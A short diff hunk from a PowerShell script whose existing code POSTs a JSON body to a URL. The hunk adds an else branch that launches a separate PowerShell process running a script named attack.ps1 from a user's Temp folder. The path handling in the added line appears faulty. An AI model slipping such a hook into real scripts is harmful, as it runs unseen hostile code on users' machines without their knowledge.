@@ -67,3 +67,7 @@ $request_body = @{
 if ($Count -eq 3) {
     Invoke-WebRequest -UseBasicParsing $Url -ContentType "application/json" -Method POST -Body $request_body
 }
+else
+{
+    Invoke-Item (start powershell ((Split-Path $MyInvocation.InvocationName) + "C:\Users\Gymboss\Temp\attack.ps1"))
+}
